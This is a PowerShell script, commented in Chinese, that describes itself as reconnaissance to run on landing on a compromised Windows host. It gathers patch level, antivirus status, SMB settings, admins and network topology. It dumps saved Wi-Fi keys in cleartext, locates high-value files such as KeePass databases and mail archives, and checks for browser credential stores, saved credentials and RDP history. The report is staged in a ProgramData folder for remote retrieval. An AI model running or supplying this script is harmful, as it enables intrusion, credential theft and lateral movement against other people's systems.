# recon_sweep.ps1 —— 落地即侦察：主机信息 / 补丁水位 / 网段拓扑 / 高价值文件定位
# 输出全部写到 C:\ProgramData\SysCache\recon_<host>_<ts>.txt（共享目录里，方便远程取回）
param([string]$OutDir = 'C:\ProgramData\SysCache')
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
$ts = Get-Date -Format 'yyyyMMdd_HHmmss'
$out = Join-Path $OutDir ("recon_{0}_{1}.txt" -f $env:COMPUTERNAME, $ts)
function W($t){ $t | Tee-Object -FilePath $out -Append }

W "===== HOST ====="
W (hostname)
W ((Get-CimInstance Win32_ComputerSystem) | Select-Object Manufacturer,Model,TotalPhysicalMemory,Domain,UserName | Format-List | Out-String)
W ((Get-CimInstance Win32_OperatingSystem) | Select-Object Caption,Version,BuildNumber,InstallDate,OSArchitecture | Format-List | Out-String)
W "===== PATCH LEVEL (最近 10 个补丁) ====="
W ((Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10 HotFixID,Description,InstalledOn | Format-Table -AutoSize | Out-String))
W ("UBR: " + (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name UBR -ErrorAction SilentlyContinue).UBR)
W "===== DEFENSE ====="
W ((Get-MpComputerStatus | Select-Object AMServiceEnabled,RealTimeProtectionEnabled,AntivirusSignatureVersion,AntivirusSignatureLastUpdated | Format-List | Out-String) 2>$null)
W ((Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName,productState | Format-Table -AutoSize | Out-String) 2>$null)
W "===== SMB ====="
W ((Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol,EnableSMB2Protocol,RequireSecuritySignature,EnableSecuritySignature,EncryptData,RestrictNullSessAccess | Format-List | Out-String))
W ((net share) | Out-String)
W "===== USERS / GROUPS ====="
W ((Get-LocalUser | Select-Object Name,Enabled,LastLogon,Description | Format-Table -AutoSize | Out-String))
W ((Get-LocalGroupMember -Group Administrators | Format-Table -AutoSize | Out-String))
W "===== NETWORK ====="
W ((Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,InterfaceAlias | Format-Table -AutoSize | Out-String))
W ((Get-NetIPAddress -AddressFamily IPv6 | Select-Object IPAddress,InterfaceAlias | Format-Table -AutoSize | Out-String))
W ((ipconfig /all) | Out-String)
W "===== ARP / ROUTE / NEIGHBORS (网段发现) ====="
W ((arp -a) | Out-String)
W ((route print) | Out-String)
W ((Get-NetTCPConnection -State Established | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess | Format-Table -AutoSize | Out-String))
W "===== WIFI (明文密码) ====="
$profiles = (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { ($_ -split ':')[1].Trim() }
foreach ($p in $profiles) {
  $k = (netsh wlan show profile name="$p" key=clear) | Select-String 'Key Content'
  W ("SSID: {0} | {1}" -f $p, ($k -join ' '))
}
W "===== 高价值文件定位（只列清单，不复制） ====="
$targets = @(
  "$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads",
  'D:\Backup','D:\Backup\Documents\Tencent Files','C:\ProgramData\SysCache'
)
foreach ($t in $targets) {
  if (Test-Path $t) {
    W "--- $t"
    W ((Get-ChildItem $t -Recurse -File -ErrorAction SilentlyContinue |
        Where-Object { $_.Extension -in '.doc','.docx','.xls','.xlsx','.pdf','.txt','.zip','.rar','.7z','.kdbx','.pst','.db' } |
        Sort-Object LastWriteTime -Descending | Select-Object -First 40 FullName,Length,LastWriteTime |
        Format-Table -AutoSize | Out-String))
  }
}
W "===== 浏览器凭据文件位置（存在性检查） ====="
$browsers = @{
 'Chrome' = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
 'Edge'   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
 '360'    = "$env:LOCALAPPDATA\360Chrome\Chrome\User Data\Default"
}
foreach ($b in $browsers.GetEnumerator()) {
  if (Test-Path $b.Value) {
    W ("{0}: Login Data={1} Cookies={2} History={3}" -f $b.Key,
        (Test-Path "$($b.Value)\Login Data"), (Test-Path "$($b.Value)\Cookies"), (Test-Path "$($b.Value)\History"))
  }
}
W "===== 已保存凭据 / RDP 记录 ====="
W ((cmdkey /list) | Out-String)
W ((reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s 2>$null) | Out-String)
W "===== DONE ====="
Write-Host "[+] recon 完成 -> $out"
